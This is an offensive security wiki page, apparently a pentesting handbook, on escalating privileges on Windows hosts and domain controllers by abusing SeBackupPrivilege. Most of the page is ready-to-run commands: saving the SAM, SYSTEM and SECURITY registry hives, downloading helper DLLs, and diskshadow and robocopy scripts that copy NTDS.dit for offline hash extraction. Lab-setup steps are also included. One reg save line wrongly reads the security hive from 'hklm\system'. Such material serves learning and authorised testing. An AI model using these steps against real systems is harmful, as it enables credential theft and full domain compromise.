# SeBackupPrivilege

## Theory

This specific privilege escalation is based on the act of assigning a user SeBackupPrivilege (by default it is assigned to the Administrators group). It was designed to allow users to create system backups. This privilege has the cost of providing the user with full read access to the file system. This privilege must bypass any ACLs that the administrator has placed on the network. So, in a nutshell, this privilege allows the user to read any file in the entirety of the files which could also include some sensitive files such as the SAM file or the SYSTEM log file. From the attacker's perspective, this can be exploited after gaining the initial foothold on the system and then moving to an elevated shell essentially reading the SAM files and possibly cracking the passwords of high privilege users on the system or network.

{% hint style="danger" %}
Before moving on to exploitation, let's explain why there is a difference in exploitation methodology between a domain controller and a Windows machine. This is because, in the case of a DC, the privilege only allows us to make backups, not copies. On a Windows system, we can make copies of files such as SAM and SYSTEM with a simple command. In the case of a DC, the method differs as we now need to back up SAM and SYSTEM files or any other sensitive files to extract the users password hash.
{% endhint %}

## Practice

### Verification

#### In Windows:

* Privileges: **SeBackupPrivilege**

INSERT IMAGE

#### In Domain Controller:

* Privileges: **SeBackupPrivilege**, **SeRestorePrivilege**
* Group: **Backup Operators**

INSERT IMAGE

### PrivEsc in Windows

{% tabs %}
{% tab title="Method #1" %}
If we only want to extract the hive records, then we can directly use these commands:

```shell
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
reg save hklm\system c:\Temp\security
```
{% endtab %}

{% tab title="Method #2" %}
If we want to extract files, we will have to import some .DLL modules and that's it:

```bash
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
# Upload the .DLL files to the compromised machine.
# We import both modules:
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Ready, we can execute the following commands:

{% hint style="warning" %}
If the privilege is disabled (we can check it with `Get-SeBackupPrivilege`), we can enable it with `Set-SeBackupPrivilege` (you need the imported DLL modules).
{% endhint %}

```powershell
Copy-FileSeBackupPrivilege '<PATH TO FILE>' .\<RENAME>
```
{% endtab %}

{% tab title="Lab Setup" %}
We are going to perform this demonstration on a Windows 10 machine that is not part of a domain. Here, we need to create a user to whom we are going to provide the privilege:

```shell
net user leviswings levi123! /add
```

Now, to create a realistic scenario, we need to enable WinRM. This can be done by opening PowerShell and enabling the PSRemoting option. Although it requires setting permissions to run scripts to bypass as demonstrated below:

```shell
powershell -c "Enable-PSRemoting" -Force
powershell -ep bypass -c "Enable-PSRemoting" -Force # Another way.
```

Now the most important step. We have to provide privileges to the newly created user. We are going to use a module called Carbon. First, we have to install the module and then import its objects into the session using the `Import-Module` option:

```powershell
powershell -c "Install-Module -Name carbon"
powershell -ep bypass -c "Import-Module carbon" # Another way.
```

There are a bunch of different cmdlets that come with the carbon module we just installed. One of the cmdlets is called **Grant-CPrivilege**. This cmdlet will be used to grant the **SeBackupPrivilege** privilege to the leviswings user we just created.

```shell
powershell -c "Grant-CPrivilege -Identity leviswings -Privilege SeBackupPrivilege"
# To test if we assign it:
powershell -c "Test-CPrivilege -Identity leviswings -Privilege SeBackupPrivilege"
```

We may need to add our user to the "Remote Management Users" group so that we can authenticate through WinRM:

{% hint style="danger" %}
The name of the "**Remote Management Users**" group **may change** depending on the **language** of the machine.
{% endhint %}

```shell
net localgroup "Remote Management Users" leviswings /add
```
{% endtab %}
{% endtabs %}

After copying the hives, we can download them to our machine and extract the hashes with [secrestsdump.py or mimikatz](../../../credential-access/os-credential-dumping/sam-and-lsa-secrets-and-cached-domain-credentials.md#practice).

### PrivEsc in DC

{% tabs %}
{% tab title="Method #1" %}
1. Create a file named pwn.dsh on your computer with the following contents:

{% code title="pwn.dsh" %}
```bash
set context persistent nowriters
add volume c: alias pwned
create
expose %pwned% z:
```
{% endcode %}

&#x20; 2\. Convert the created file to DOS format:

```
unix2dos pwn.dsh
```

&#x20; 3\. We transfer the file to the compromised machine.

&#x20; 4\. We execute the following commands to extract the NTDS.dit:

```shell
diskshadow /s pwn.dsh
# robocopy syntax:
robocopy /b <PATH_TO_DIRECTORY> <PATH_TO_BACKUP> <FILENAME>
robocopy /b z:\windows\ntds . ntds.dit # We make a backup from Z to C of the NTDS.dit:
# Done. All this procedure is to get the NTDS.dit, we only need the SYSTEM:
reg save hklm\system C:\Windows\Temp\system.bak
# In case it does not work, we do:
robocopy /b z:\Windows\System32\config . SYSTEM
```
{% endtab %}

{% tab title="Method #2" %}
{% hint style="danger" %}
If the privilege is disabled (we can check it with **Get-SeBackupPrivilege**), we can enable it with **Set-SeBackupPrivilege** (the imported DLL modules are needed).
{% endhint %}

```bash
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
# Upload .DLL files
# We import both modules:
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
# Run the following commands with diskshadow.exe:
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
# Done. We make a backup from E to C of the NTDS.dit:
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
# Done. All this procedure is to get the NTDS.dit, we only need the SYSTEM:
reg save hklm\system C:\Windows\Temp\system.bak
# In case it does not work, we do:
Copy-FileSeBackupPrivilege E:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.bak
```
{% endtab %}

{% tab title="Lab Setup" %}
### Requirements

Install Active Directory services to operate as Domain Controller.

### Lab Setup

Let's create a new user by adding it to the `Backup Operators` group:

![](../../../../.gitbook/assets/lab\_setup\_backup\_operators\_1.png)

![](../../../../.gitbook/assets/lab\_setup\_backup\_operators\_2.png)

![](../../../../.gitbook/assets/lab\_setup\_backup\_operators\_3.png)

![](../../../../.gitbook/assets/lab\_setup\_backup\_operators\_4.png)

![](../../../../.gitbook/assets/lab\_setup\_backup\_operators\_5.png)

Now, to create a realistic scenario, we need to enable WinRM. This can be done by opening PowerShell and enabling the PSRemoting option. Although it requires setting permissions to run scripts to bypass as demonstrated below:

```shell
powershell -c "Enable-PSRemoting" -Force
powershell -ep bypass -c "Enable-PSRemoting" -Force # Another way
```
{% endtab %}
{% endtabs %}

With the NTDS.dit file and the SYSTEM file, we download it to our machine and extract all the hashes as shown here.

## References

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege" %}
